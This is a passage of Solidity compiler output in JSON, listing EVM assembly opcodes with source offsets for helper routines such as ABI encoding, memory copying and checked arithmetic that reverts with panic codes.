											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1349,
											"end": 1355,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1269,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 1269,
											"end": 1362,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1269,
											"end": 1362,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 1269,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1262,
											"end": 1362,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1262,
											"end": 1362,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1379,
											"end": 1382,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1372,
											"end": 1382,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1372,
											"end": 1382,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1117,
											"end": 1388,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1507,
											"end": 1511,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1545,
											"end": 1547,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1534,
											"end": 1543,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1530,
											"end": 1548,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1522,
											"end": 1548,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1522,
											"end": 1548,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1558,
											"end": 1627,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1624,
											"end": 1625,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1613,
											"end": 1622,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1609,
											"end": 1626,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1600,
											"end": 1606,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1558,
											"end": 1627,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1558,
											"end": 1627,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1558,
											"end": 1627,
											"name": "tag",
											"source": 1,
											"value": "53"
										},
										{
											"begin": 1558,
											"end": 1627,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1637,
											"end": 1703,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1699,
											"end": 1701,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1688,
											"end": 1697,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1684,
											"end": 1702,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1675,
											"end": 1681,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1637,
											"end": 1703,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1637,
											"end": 1703,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1637,
											"end": 1703,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1637,
											"end": 1703,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1394,
											"end": 1710,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1716,
											"end": 2135,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 1716,
											"end": 2135,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1882,
											"end": 1886,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1920,
											"end": 1922,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1909,
											"end": 1918,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1905,
											"end": 1923,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1897,
											"end": 1923,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1897,
											"end": 1923,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1969,
											"end": 1978,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1963,
											"end": 1967,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1959,
											"end": 1979,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1955,
											"end": 1956,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1944,
											"end": 1953,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1940,
											"end": 1957,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1933,
											"end": 1980,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1997,
											"end": 2128,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 2123,
											"end": 2127,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1997,
											"end": 2128,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1997,
											"end": 2128,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1997,
											"end": 2128,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 1997,
											"end": 2128,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1989,
											"end": 2128,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1989,
											"end": 2128,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1716,
											"end": 2135,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1716,
											"end": 2135,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1716,
											"end": 2135,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1716,
											"end": 2135,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2234,
											"end": 2238,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2272,
											"end": 2274,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2261,
											"end": 2270,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2257,
											"end": 2275,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2249,
											"end": 2275,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2249,
											"end": 2275,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2285,
											"end": 2356,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 2353,
											"end": 2354,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2342,
											"end": 2351,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2338,
											"end": 2355,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2329,
											"end": 2335,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2285,
											"end": 2356,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 2285,
											"end": 2356,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2285,
											"end": 2356,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 2285,
											"end": 2356,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2141,
											"end": 2363,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2369,
											"end": 2467,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 2369,
											"end": 2467,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2420,
											"end": 2426,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2454,
											"end": 2459,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2448,
											"end": 2460,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 2438,
											"end": 2460,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2438,
											"end": 2460,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2369,
											"end": 2467,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2369,
											"end": 2467,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2369,
											"end": 2467,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2369,
											"end": 2467,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2574,
											"end": 2585,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2611,
											"end": 2614,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2596,
											"end": 2614,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2596,
											"end": 2614,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2473,
											"end": 2620,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2710,
											"end": 2721,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2744,
											"end": 2750,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2739,
											"end": 2742,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2732,
											"end": 2751,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2784,
											"end": 2788,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2779,
											"end": 2782,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2775,
											"end": 2789,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2760,
											"end": 2789,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2760,
											"end": 2789,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2626,
											"end": 2795,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2841,
											"end": 2842,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2858,
											"end": 2878,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 2876,
											"end": 2877,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2858,
											"end": 2878,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 2858,
											"end": 2878,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2858,
											"end": 2878,
											"name": "tag",
											"source": 1,
											"value": "63"
										},
										{
											"begin": 2858,
											"end": 2878,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2853,
											"end": 2878,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2853,
											"end": 2878,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2892,
											"end": 2912,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 2910,
											"end": 2911,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2892,
											"end": 2912,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 2892,
											"end": 2912,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2892,
											"end": 2912,
											"name": "tag",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 2892,
											"end": 2912,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2887,
											"end": 2912,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2887,
											"end": 2912,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2931,
											"end": 2932,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2921,
											"end": 2956,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2921,
											"end": 2956,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2936,
											"end": 2954,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 2936,
											"end": 2954,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 2936,
											"end": 2954,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2936,
											"end": 2954,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 2936,
											"end": 2954,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2921,
											"end": 2956,
											"name": "tag",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2921,
											"end": 2956,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2978,
											"end": 2979,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2975,
											"end": 2976,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2971,
											"end": 2980,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 2966,
											"end": 2980,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2966,
											"end": 2980,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2801,
											"end": 2986,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3032,
											"end": 3036,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3052,
											"end": 3072,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "69"
										},
										{
											"begin": 3070,
											"end": 3071,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3052,
											"end": 3072,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 3052,
											"end": 3072,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3052,
											"end": 3072,
											"name": "tag",
											"source": 1,
											"value": "69"
										},
										{
											"begin": 3052,
											"end": 3072,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3047,
											"end": 3072,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3047,
											"end": 3072,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3086,
											"end": 3106,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 3104,
											"end": 3105,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3086,
											"end": 3106,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 3086,
											"end": 3106,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3086,
											"end": 3106,
											"name": "tag",
											"source": 1,
											"value": "70"
										},
										{
											"begin": 3086,
											"end": 3106,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3081,
											"end": 3106,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3081,
											"end": 3106,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3125,
											"end": 3126,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3122,
											"end": 3123,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3119,
											"end": 3127,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 3116,
											"end": 3150,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3116,
											"end": 3150,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "71"
										},
										{
											"begin": 3116,
											"end": 3150,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3130,
											"end": 3148,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 3130,
											"end": 3148,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "73"
										},
										{
											"begin": 3130,
											"end": 3148,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3130,
											"end": 3148,
											"name": "tag",
											"source": 1,
											"value": "72"
										},
										{
											"begin": 3130,
											"end": 3148,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3116,
											"end": 3150,
											"name": "tag",
											"source": 1,
											"value": "71"
										},
										{
											"begin": 3116,
											"end": 3150,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3175,
											"end": 3176,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3172,
											"end": 3173,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3168,
											"end": 3177,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 3160,
											"end": 3177,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3160,
											"end": 3177,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2992,
											"end": 3183,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3189,
											"end": 3279,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 3189,
											"end": 3279,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3223,
											"end": 3230,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3266,
											"end": 3271,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3259,
											"end": 3272,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3252,
											"end": 3273,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3241,
											"end": 3273,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3241,
											"end": 3273,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3189,
											"end": 3279,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3189,
											"end": 3279,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3189,
											"end": 3279,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3189,
											"end": 3279,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3285,
											"end": 3434,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 3285,
											"end": 3434,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3321,
											"end": 3328,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3361,
											"end": 3427,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3354,
											"end": 3359,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3350,
											"end": 3428,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 3339,
											"end": 3428,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3339,
											"end": 3428,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3285,
											"end": 3434,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3285,
											"end": 3434,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3285,
											"end": 3434,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3285,
											"end": 3434,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3440,
											"end": 3517,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 3440,
											"end": 3517,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3477,
											"end": 3484,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3506,
											"end": 3511,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3495,
											"end": 3511,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3495,
											"end": 3511,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3440,
											"end": 3517,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3440,
											"end": 3517,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3440,
											"end": 3517,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3440,
											"end": 3517,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3523,
											"end": 3830,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 3523,
											"end": 3830,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3591,
											"end": 3592,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "tag",
											"source": 1,
											"value": "78"
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3615,
											"end": 3621,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3612,
											"end": 3613,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3609,
											"end": 3622,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3700,
											"end": 3701,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3695,
											"end": 3698,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 3691,
											"end": 3702,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3685,
											"end": 3703,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3681,
											"end": 3682,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3676,
											"end": 3679,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3672,
											"end": 3683,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3665,
											"end": 3704,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3637,
											"end": 3639,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3634,
											"end": 3635,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3630,
											"end": 3640,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3625,
											"end": 3640,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3625,
											"end": 3640,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "78"
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "tag",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 3601,
											"end": 3714,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3732,
											"end": 3738,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3729,
											"end": 3730,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3726,
											"end": 3739,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 3723,
											"end": 3824,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 3723,
											"end": 3824,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "81"
										},
										{
											"begin": 3723,
											"end": 3824,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 3812,
											"end": 3813,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3803,
											"end": 3809,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3798,
											"end": 3801,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 3794,
											"end": 3810,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3787,
											"end": 3814,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3723,
											"end": 3824,
											"name": "tag",
											"source": 1,
											"value": "81"
										},
										{
											"begin": 3723,
											"end": 3824,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3572,
											"end": 3830,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3523,
											"end": 3830,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3523,
											"end": 3830,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3523,
											"end": 3830,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3523,
											"end": 3830,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3836,
											"end": 4016,
											"name": "tag",
											"source": 1,
											"value": "73"
										},
										{
											"begin": 3836,
											"end": 4016,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3884,
											"end": 3961,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3881,
											"end": 3882,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3874,
											"end": 3962,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3981,
											"end": 3985,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 3978,
											"end": 3979,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 3971,
											"end": 3986,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 4005,
											"end": 4009,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 4002,
											"end": 4003,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3995,
											"end": 4010,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 4022,
											"end": 4202,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 4022,
											"end": 4202,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 4070,
											"end": 4147,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 4067,
											"end": 4068,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 4060,
											"end": 4148,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 4167,
											"end": 4171,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 4164,
											"end": 4165,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 4157,
											"end": 4172,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 4191,
											"end": 4195,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 4188,
											"end": 4189,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 4181,
											"end": 4196,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 4208,
											"end": 4367,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 4208,
											"end": 4367,
											"name": "JUMPDEST",
											"source": 1
										},
										{
